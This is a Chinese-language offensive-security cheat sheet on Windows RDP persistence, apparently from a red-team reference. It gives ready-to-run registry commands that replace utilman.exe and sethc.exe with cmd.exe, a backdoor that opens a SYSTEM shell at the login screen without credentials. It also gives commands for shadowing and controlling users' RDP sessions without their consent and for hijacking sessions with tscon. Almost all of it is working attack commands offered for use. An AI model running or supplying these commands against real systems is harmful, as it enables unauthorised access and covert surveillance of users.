# RDP - 持久化 (Persistence)

## RDP 后门 (RDP Backdoor)

RDP 后门是一种恶意技术，攻击者将辅助工具管理器 (utilman.exe) 或粘滞键 (sethc.exe) 的合法二进制文件替换为命令提示符 (cmd.exe) 可执行文件。这使得攻击者可以通过在登录屏幕上按下“轻松使用”或“粘滞键”按钮来启动命令提示符，从而获得系统的未经授权访问，绕过对凭据验证的需求。

### utilman.exe

在登录界面按下 Windows 键+U，即可获得一个以 SYSTEM 权限运行的 cmd.exe 窗口。

```powershell
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
```

### sethc.exe

在 RDP 登录界面连续多次按下 F5 键。

```powershell
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
```

## RDP 会话阴影 (RDP Shadowing)

RDP 会话阴影 (RDP shadowing) 是远程桌面协议 (RDP) 的一项功能，允许远程用户在 Windows 计算机上查看或控制另一名用户的活动 RDP 会话。此功能通常用于远程协助、培训或协作，允许一名用户观察或控制另一名用户的桌面、应用程序和输入设备，就像他们亲临现场一样。

**要求 (Requirements)**

* `TermService` 必须正在运行。

    ```ps1
    sc.exe \\MYSERVER query TermService
    sc.exe \\MYSERVER start TermService
    ```

* `SYSTEM` 权限或账户密码。

**启用 RDP 会话阴影 (Enable RDP Shadowing)**

可以通过编辑注册表键 `HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services` 来启用阴影远程桌面会话。

| 数值 | 名称                  | 描述 |
| ----- | --------------------- | --- |
|   0   | Disable               | 禁用远程控制。 |
|   1   | EnableInputNotify     | 经用户许可后，远程控制者对用户会话拥有完全控制权。 |
|   2   | EnableInputNoNotify   | 远程控制者对用户会话拥有完全控制权，且无需用户许可。 |
|   3   | EnableNoInputNotify   | 经用户许可后，远程控制者可以远程查看会话，但不能主动控制会话。 |
|   4   | EnableNoInputNoNotify | 远程控制者可以远程查看会话，但不能主动控制会话，且无需用户许可。 |

通常你会希望能够查看并与远程桌面交互：选择选项 2 `EnableInputNoNotify`。

```ps1
reg.exe query "\\MYSERVER\HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services" /V Shadow
reg.exe add "\\MYSERVER\HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services" /V Shadow /T REG_DWORD /D 2 /F
```

如果遇到任何网络问题，请启用“远程桌面 - 阴影 (TCP-In)”防火墙规则。

```ps1
$so = New-CimSessionOption -Protocol Dcom
$s = New-CimSession -ComputerName MYSERVER -SessionOption $so
$fwrule = Get-CimInstance -Namespace ROOT\StandardCimv2 -ClassName MSFT_NetFirewallRule -Filter 'DisplayName="Remote Desktop - Shadow (TCP-In)"' -CimSession $s
$fwrule | Invoke-CimMethod -MethodName Enable
```

**枚举活动用户 (Enumerate active users)**

查询以枚举机器上的活动用户。

```ps1
quser.exe /SERVER:MYSERVER
query.exe user /server:MYSERVER
qwinsta.exe /server:MYSERVER
```

**使用阴影模式 (Use the shadow mode)**

使用 `noConsentPrompt` 参数并指定从上一个命令中获得的会话 ID。

```ps1
MSTSC [/v:<服务器[:端口]>] /shadow:<会话ID> [/control] [/noConsentPrompt]
mstsc /v:SRV2016 /shadow:1 /noConsentPrompt
mstsc /v:SRV2016 /shadow:1 /noConsentPrompt /control
```

在较旧版本中，你必须改用 `tscon.exe`。

```ps1
psexec -s cmd
cmd /k tscon 2 /dest:console
```

## 参考资料 (References)

* [Spying on users using Remote Desktop Shadowing - Living off the Land - Mar 26, 2021 - @bitsadmin](https://blog.bitsadmin.com/spying-on-users-using-rdp-shadowing)
* [RDP Hijacking for Lateral Movement with tscon - ired.team - 2019](https://www.ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement)
